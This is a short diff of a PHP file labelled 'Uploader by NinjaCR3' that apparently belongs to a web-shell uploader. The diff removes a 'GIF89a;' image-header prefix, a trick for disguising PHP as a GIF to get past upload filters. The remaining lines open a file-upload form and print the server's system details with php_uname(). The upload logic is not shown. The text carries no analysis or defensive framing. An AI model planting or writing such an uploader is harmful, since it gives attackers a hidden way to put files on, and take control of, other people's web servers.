@@ -1,4 +1,3 @@
-GIF89a;
 <?php 
 echo '<html><form action="" method="POST" enctype="multipart/form-data" name="uploader" id="uploader"><title>Uploader by NinjaCR3</title><p>Uploader by NinjaCR3<br>';
 echo php_uname();
